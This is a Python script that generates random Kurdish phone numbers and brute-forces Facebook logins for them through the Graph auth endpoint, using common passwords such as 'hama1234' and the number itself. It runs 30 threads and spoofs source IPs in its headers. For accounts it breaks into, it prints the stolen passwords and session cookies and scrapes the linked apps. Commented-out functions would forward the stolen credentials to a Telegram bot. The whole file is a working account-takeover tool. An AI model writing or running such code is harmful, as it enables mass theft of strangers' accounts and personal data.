#!Facebook × @apooka00
import requests
import random
import time
from rich import print as color_new
from rich.progress import Progress
from rich.console import Console
from telebot import TeleBot
import concurrent.futures
from colorama import Fore, init, Style
import os, sys, time, random, json, re, telebot, string, user_agent


init(autoreset=True)
reset=Style.RESET_ALL
bold=Style.BRIGHT
white=Fore.WHITE
blue=Fore.BLUE
yellow=Fore.YELLOW
red=Fore.RED
green=Fore.GREEN
cyan=Fore.CYAN
name_system=(__name__)
name_tool=("__main__")
name_systems=(os.name)
console=Console()

hit = 0
bad = 0
retry,fac=0,0

def clear():
   def system_mobile(): 
     os.system(
     "clear"
     )
   def system_windows10():
      os.system(
      "cls"
      )
   if name_systems == "nt":
       system_windows10()
       return 
   system_mobile()
   return
clear();print();()

("apooka00")
print()

IDS=[]

def make_numbers(limitd,code):
   for _ in range(limitd):
      num="".join(random.choice(string.digits)for _ in range(7))
      IDS.append(str(num))
   return
      

print(reset+white+bold+"═══════════════[Step 1]═════════════════════")
code_kurdish=input(reset+white+bold+"["+reset+yellow+bold+"+"+reset+white+bold+"]"+reset+white+bold+" Put Code Kurdish (0750 and More): ")
try:limitd=int(input(reset+white+bold+"["+reset+yellow+bold+"+"+reset+white+bold+"] How Many Number (30000 and More): "))
except:limitd=30000
print(reset+white+bold+"═══════════════[Step 2]═════════════════════")
print(reset+yellow+bold+"Generate {} Number Support {} ....".format(limitd,code_kurdish))
A=[make_numbers(limitd,code_kurdish)]
time.sleep(3)
print(reset+green+bold+"Generated is successfully💥")
print(reset+white+bold+"═══════════════[Step 3]═════════════════════")
msgs=(
f"{reset+green+bold}Successfully all step\n"
f"{reset+blue+bold}Please Waite To Check ID."
)
print(msgs)
("APPOLLO")
print()





def check_log(numbers,ids,pwx):
   global hit,bad,retry,fac
   sys.stdout.write("\r\r\r"+reset+white+bold+f"Attemp: {len(IDS)} | "+reset+green+bold+f"OK: {hit} | "+reset+yellow+bold+f"2FA: {fac} | "+reset+red+bold+f"BAD: {bad} | "+reset+cyan+bold+f"Retries: {retry} "),
   sys.stdout.flush()
   for password in pwx:
      data ={
      "locale": "en_GB",
      "format": "json",
      "email":numbers,
      "password":password,
      "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
      "generate_session_cookies": 1
      }
      head = {
      'user-agent':"Dalvik/2.1.0 (Linux; U; Android 15; 2310FPCA4G Build/AP3A.240905.015.A2) [FBAN/Orca-Android;FBAV/243.0.0.24.835;FBBV/959252622;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/Xiaomi;FBBD/POCO;FBDV/2310FPCA4G;FBSV/15;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=6.9,width=966,height=1838};FB_FW/1;]",
      'Host':'graph.facebook.com',
      'Content-Type':'application/json;charset=utf-8',
      'Content-Length':'595',
      'Connection':'Keep-Alive',
      'Accept-Encoding':'gzip'
      }
      proxy={}
      try:
        response=requests.post(
        "https://b-graph.facebook.com/auth/login",
        headers=head,
        data=data,
        allow_redirects=False,
        proxies=proxy
        )
      except requests.exceptions.RequestException:
         retry+=1
      if "error" in response.text:
         if "www.facebook.com" in response.json()["error"]["message"]:
             iddf=response.json()["error"].get("error_data","N/A").get("uid","N/A")
             print("\r\r\r"+reset+white+bold+"[Apo-Cp] "+reset+yellow+bold+f"➡ ID: {iddf} ➡ Phone: {numbers} ➡ Pass: {password} ")
             fac+=1
             break
      if "c_user" in response.text or "session_key" in response.json():
          kuk={A["name"]: A["value"] for A in response.json()['session_cookies']}
          cok=";".join(C["name"]+"="+C["value"] for C in response.json().get("session_cookies","N/A"))
          id_fb=kuk.get('c_user',"N/A")
          APP=result(kuk)
          if APP:  
             apps=", ".join(APP)
          else:apps="N/A"
          print("\r\r\r"+reset+white+bold+"[Apo-Ok] "+reset+green+bold+f"➡ ID: {id_fb} ➡ Pass: {password} ➡ Cookies: {cok} ")
          if APP:
            game=APP.copy()
            for games in game:
              print("\r\r\r"+reset+white+bold+f"     ➥ "+reset+green+bold+f"{games}")
            pass
          hit+=1
          break
   else:bad+=1

def send_ser(iddf,numbers,password):
      messg=(
      f"Secured Facebook Account\n"
      f"ID: {iddf}\n"
      f"Phone: {numbers}\n"
      f"Password: {password}\n"
      f"------------------------------\n"
      "Developer: @apooka00"
      )   
#      Message.send_message(chat_id=id_bot,text=messg)
def send_server(id_fb,numbers,password,apps):
   mess=(
   f"Success Facebook Account\n"
   f"ID: {id_fb}\n"
   f"Phone: {numbers}\n"
   f"Password: {password}\n"
   f"App Linked: {apps}\n"
   f"-----------------------------\n"
   "Developer: @apooka00"
   )
#   Message.send_message(chat_id=id_bot,text=mess)
   
   
def result(kuk):
  for _ in range(5):
      random_ip=f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
      headers={
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': 'https://www.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-full-version-list': '"Not A(Brand";v="8.0.0.0", "Chromium";v="132.0.6961.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user_agent.generate_user_agent(),
            'viewport-width': '980',
            "Forwarded": f"for={random_ip}; by={random_ip}",
            "X-Forwarded-For": random_ip,
            "X-Real-IP": random_ip,
            "Client-IP": random_ip,
      }
      api="https://www.facebook.com/settings/"
      response = requests.get(
      api,
      params={'tab': 'applications'},
      cookies=kuk,
      headers=headers,
      timeout=15
      ).text
      apo=(re.findall(r'"app_name":"(.*?)"', response))
      if bool(apo):
         return apo
      else:continue

def check_all():
 with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
   for ids in IDS:
      numbers=code_kurdish+str(ids)
      pwx=["hama1234","zaxo1234","zaxozaxo",numbers,ids]
      apooka00=[executor.submit(check_log,numbers,ids,pwx)]
      apooka00=[]
      



def main():
    check_all()



if __name__ in '__main__':
   main()





  
  